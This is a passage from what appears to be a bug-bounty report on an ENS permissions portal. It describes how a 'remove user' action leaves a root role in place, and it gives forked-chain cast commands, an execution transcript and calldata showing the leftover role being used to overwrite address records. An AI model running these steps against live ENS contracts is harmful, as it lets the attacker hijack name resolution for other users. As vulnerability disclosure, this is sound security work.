# roleless Z -> REVERTS (the gate itself works)
cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE1 60 $EVIL --from $Z --private-key $PK_Z --rpc-url $RPC --gas-limit 300000

# B revoking itself -> REVERTS (only role-admins revoke; the wrong-scope tx can only come from the operator through the app)
cast send $C2 "authorizeNameRoles(bytes,uint256,address,bool)" $DNS 0x11 $B false --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000

# the CORRECT removal exists; the client never builds it for mixed rows
cast send $C2 "revokeRootRoles(uint256,address)" 1 $B --from $A --private-key $PK_A --rpc-url $RPC --gas-limit 300000
cast call $C2 "roles(uint256,address)(uint256)" 0 $B --rpc-url $RPC
# -> 0
cast send $C2 "setAddr(bytes32,uint256,bytes)" $NODE1 60 $EVIL --from $B --private-key $PK_B --rpc-url $RPC --gas-limit 300000
# -> REVERTS
```

{% endstep %}
{% endstepper %}

Expected vs actual: the dialog says "remove this user from all roles". Expected after removal: `roles(0,B) = 0`. Actual: `roles(0,B) = 1`, and B writes addr records for any name on the resolver afterward.

Executed transcript at the pinned block:

```
before: root=1 name=16
4. ui remove-user tx: status 0x1
   after:  root=1 name=0     << root still there, only the name part died
5a. harmonia.eth addr write: status 0x1
5b. crypto.eth  addr write: status 0x1
    readbacks: 0x00000000000000000000000000000000deadbeef / 0x00000000000000000000000000000000deadbeef
6. Z (never had roles): reverted as expected
7. B revoking itself:   reverted as expected (only role-admins revoke)
8. the real removal:    status 0x1 -> root=0
   then B tries again:  reverted - removal complete
```

Rig notes for a re-run: the fork block is pinned, so the run is deterministic; two independent runs at this pin produced byte-identical transactions; the only values that are chain-historical are the factory/impl bytecodes, and the CREATE2 address was unoccupied at that height. If a cold cast send against a public-RPC fork intermittently reverts, issue the identical call once as cast call first, then send. setAddr takes the raw 20 address bytes for coin 60, not an ABI word.

### d. Byte-identity of the app-built intent and the fork send

The removal transaction executed on the fork above is the encoding the application builds. The harness above drives the app's own grouping, the sidebar's verbatim scope pick, and the app's own transaction builder with the same two indexer records the fork readbacks print (root bitmap 1, name bitmap 16), and asserts the produced intent's target, its selector `authorizeNameRoles(bytes,uint256,address,bool)`, its bitmap word (the union `0x11`), and its dns-encoded name; the control case asserts the full argument words of the root-branch call. The full encoding of the fork's send reproduces independently of the app:

```sh
cast calldata "authorizeNameRoles(bytes,uint256,address,bool)" 0x086861726d6f6e69610365746800 0x11 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 false
```

→

```
0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001100000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000e086861726d6f6e69610365746800000000000000000000000000000000000000
```

which is byte-for-byte the calldata of the step-4 cast send, on every word the harness asserts and on the words it passes through from its own constants.

### e. Non-portal references

* ensjs, pinned branch `feature/fet-1885-ensjs-refactor`: `packages/ensjs/src/actions/wallet/v2/grantResolverRoles.ts`, `revokeResolverRoles.ts` — ensjs is not a listed in-scope asset, which is why these references live here; the in-scope defect is the portal code detailed under Vulnerability Details.
* Contracts, execution environment only, behaving as designed in every control: Blockscout-verified `PermissionedResolverImpl` `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e` (PermissionedResolver.sol:273-294, 665; EnhancedAccessControl.sol:444-455); `VerifiableFactory` `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef` (used in the setup above).
* Program scope page: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
